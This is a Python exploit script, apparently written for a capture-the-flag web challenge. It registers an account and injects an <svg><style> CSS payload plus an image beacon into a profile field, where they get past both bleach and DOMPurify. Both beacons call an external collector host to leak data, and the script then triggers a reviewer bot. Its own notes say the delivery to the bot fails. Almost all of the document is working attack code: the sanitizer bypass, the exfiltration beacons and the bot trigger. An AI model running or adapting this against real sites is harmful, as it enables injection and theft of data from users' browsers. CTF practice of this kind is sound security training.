#!/usr/bin/env python3
"""
larpin2 harness. BLOCKED: the exfil primitive works, bot delivery doesn't.

All verified against a live instance:
    1. register an account
    2. plant an <img> beacon and an @import CSS beacon in the profile About
       field, which survive both the server-side bleach pass and DOMPurify
       3.4.14 wrapped as <svg><style>...</style></svg>
    3. --selfcheck drives real headless Chrome to the profile and fires both
    4. apply to job 1, the only trigger that wakes the reviewer
"""
import os
import re
import sys
import time
import urllib.parse

import requests

DEFAULT = "https://larpbrev-45ee685790798b52.challs.ctf.thefewchosen.com"
BASE = (os.environ.get("CTF_TARGET") or os.environ.get("LARPIN") or DEFAULT).rstrip("/")
CB = os.environ.get("CTF_COLLECTOR", "https://postcard-foot-additionally-block.trycloudflare.com")
TAG = os.environ.get("CTF_TAG", "l2a")
PW = "Passw0rd!23"


def client(user):
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"
    s.post(BASE + "/auth", data={"action": "register", "username": user,
                                 "full_name": user, "password": PW}, timeout=25)
    r = s.post(BASE + "/auth", data={"action": "login", "username": user,
                                     "password": PW}, timeout=25,
               allow_redirects=False)
    assert r.status_code == 302, r.status_code
    return s


def plant(s, user, css_body=None):
    """Profile About is the only surviving HTML sink.

    Server side: bleach keeps <svg> <style> <div> <a> <span> <b> and
    <img src|width|height|alt|class|id>, drops style= and event handlers.
    Client side: profile.js does innerHTML = DOMPurify.sanitize(data-raw);
    DOMPurify 3.4.14 with no config strips a bare <style> but KEEPS
    <svg><style>, so CSS injection survives both passes.
    """
    css = css_body or '@import url("%s/%s/css.css");' % (CB, TAG)
    about = ('<img src="%s/%s/marker.png">' % (CB, TAG)
             + "<svg><style>" + css + "</style></svg>")
    s.post(BASE + "/profile/edit",
           data={"full_name": "Ell Two", "headline": "QA", "about": about,
                 "experience": "", "education": ""}, timeout=25)
    h = s.get(BASE + "/profile/" + user, timeout=25).text
    m = re.search(r'profile-content" style="white-space: pre-wrap;"\s*data-raw="([^"]*)"', h)
    stored = urllib.parse.unquote(m.group(1)) if m else ""
    assert "<style>" in stored, "server-side bleach ate the style tag: %r" % stored
    return stored


def wake_bot(s):
    """Job 1 is posted by Trust & Safety and is the ONLY trigger that wakes
    the reviewer bot. A user-created job produces no bot activity."""
    r = s.post(BASE + "/jobs/1/apply",
               files={"resume": ("cv.txt", b"hi", "text/plain")},
               data={"cover_letter": "cl"}, timeout=25, allow_redirects=False)
    return r.headers.get("location", "")


def rejection_arrived(s):
    """The bot's canned rejection DM. Message text is percent-encoded inside
    data-raw, so match on the encoded form too or you will miss it."""
    h = s.get(BASE + "/messages", timeout=25).text
    for raw in re.findall(r'data-raw="([^"]*)"', h):
        if "Thank you for applying" in urllib.parse.unquote(raw):
            return True
    return False


def selfcheck(user):
    """Drive real Chrome to our own profile to prove the beacons fire."""
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        b = p.chromium.launch(executable_path=os.path.expanduser("~/ctf-tools/chrome/chrome"),
                              args=["--no-sandbox", "--disable-gpu"])
        pg = b.new_page()
        pg.goto(BASE + "/", wait_until="load")
        pg.fill("input[name=username]", user)
        pg.fill("input[name=password]", PW)
        pg.click("button[value=login]")
        pg.wait_for_load_state("load")
        pg.goto(BASE + "/profile/" + user, wait_until="load")
        time.sleep(6)
        b.close()


def main():
    user = os.environ.get("CTF_USER", "l2a%d" % (int(time.time()) % 100000))
    s = client(user)
    print("[+] user", user, "on", BASE)
    print("[+] stored About:", plant(s, user))
    if "--selfcheck" in sys.argv:
        selfcheck(user)
        print("[+] selfcheck done, expect %s/%s/marker.png and css.css in the collector" % (CB, TAG))
        return
    print("[+] apply:", wake_bot(s))
    t0 = time.time()
    while time.time() - t0 < 600:
        if rejection_arrived(s):
            print("[+] reviewer bot ran at t=%.0fs (rejection DM)" % (time.time() - t0))
            break
        time.sleep(5)
    else:
        print("[-] no rejection DM in 600 s")
    print("[!] BLOCKED: the bot renders /messages?user=<numeric id> only and")
    print("    never loads /profile/<us>, so the CSS oracle has no delivery.")
    print("    Check the collector for %s/%s/* to confirm the negative." % (CB, TAG))


if __name__ == "__main__":
    main()
